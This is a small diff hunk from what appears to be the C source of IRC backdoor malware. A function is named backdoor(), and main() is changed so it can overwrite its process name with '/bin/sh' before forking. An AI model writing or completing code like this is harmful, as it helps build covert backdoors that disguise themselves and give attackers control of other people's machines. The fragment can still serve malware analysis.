@@ -39,7 +39,7 @@ void backdoor()
 	free(irc);
 }
 
-int main(int argc, char const *argv[])
+int main(int argc, char *argv[])
 {
 	strncpy(argv[0], "/bin/sh", strlen(argv[0]));
 	pid_t process_id = fork();
